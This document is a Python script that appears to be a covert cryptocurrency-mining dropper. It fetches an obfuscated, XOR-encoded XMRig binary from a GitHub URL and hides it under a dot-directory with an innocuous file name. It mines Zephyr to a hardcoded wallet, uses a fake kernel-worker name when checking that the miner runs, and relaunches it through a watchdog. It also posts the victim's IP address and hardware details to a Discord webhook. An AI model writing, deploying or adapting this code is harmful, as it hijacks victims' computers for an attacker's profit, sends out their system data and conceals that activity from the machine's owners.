import os, sys, time, json, socket, shutil, platform, subprocess, requests, base64, threading
import psutil

# ====== CONFIGURABLE ======
WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # your Discord webhook here
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker001"
POOL = "fr.zephyr.herominers.com:1123"
XMRIG_URL = "https://raw.githubusercontent.com/Anderson816/foreverminer/refs/heads/main/forever.b64"
FAKE_PROCNAME = "kworker/u8:0"
INSTALL_DIR = os.path.expanduser("~/.local/share/.kdev")
BIN_PATH = os.path.join(INSTALL_DIR, "dbus-notify")

# ====== DISCORD NOTIFY ======
def notify(msg):
    try:
        requests.post(WEBHOOK, json={"content": msg})
    except: pass

# ====== SYSTEM INFO ======
def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=3).text
    except:
        return socket.gethostbyname(socket.gethostname())

def system_info():
    try:
        return f"""🖥️ **System Boot**
🧠 CPU: {platform.processor() or platform.machine()}
💾 RAM: {round(psutil.virtual_memory().total/1024**3, 2)}GB
🔢 Threads: {psutil.cpu_count()}
📈 Load: {os.getloadavg() if hasattr(os, 'getloadavg') else '?'}
🌍 IP: {get_ip()}
📂 Path: `{BIN_PATH}`
🔁 Proc: `{FAKE_PROCNAME}`
"""
    except Exception as e:
        return f"System info error: {e}"

# ====== XMRIG DEPLOYMENT ======
def download_and_deploy():
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        response = requests.get(XMRIG_URL, timeout=10)
        if response.status_code != 200:
            raise Exception("XMRig b64 fetch failed")
        decoded = bytearray(base64.b64decode(response.content))
        for i in range(len(decoded)):
            decoded[i] ^= 0x69
        with open(BIN_PATH, "wb") as f:
            f.write(decoded)
        os.chmod(BIN_PATH, 0o700)
        return True
    except Exception as e:
        notify(f"❌ install_miner FAIL: {e}")
        return False

# ====== MINER START ======
def start_miner():
    try:
        cmd = [BIN_PATH, "-o", POOL, "-u", WALLET, "--donate-level", "1", "--background"]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        notify("✅ Miner started")
    except Exception as e:
        notify(f"❌ start_miner FAIL: {e}")

# ====== CHECKER ======
def is_running():
    for p in psutil.process_iter(['cmdline']):
        try:
            if FAKE_PROCNAME in ' '.join(p.info['cmdline']) or BIN_PATH in ' '.join(p.info['cmdline']):
                return True
        except: pass
    return False

# ====== WATCHDOG ======
def watchdog():
    while True:
        if not is_running():
            notify("⚠️ Miner down - attempting relaunch...")
            start_miner()
        time.sleep(60)

# ====== MAIN ENTRY ======
def main():
    notify(system_info())
    if not os.path.isfile(BIN_PATH):
        if download_and_deploy():
            notify("🧬 XMRig deployed from GitHub")
    start_miner()
    threading.Thread(target=watchdog, daemon=True).start()
    while True: time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        notify(f"🔥 Top-level crash: {e}")
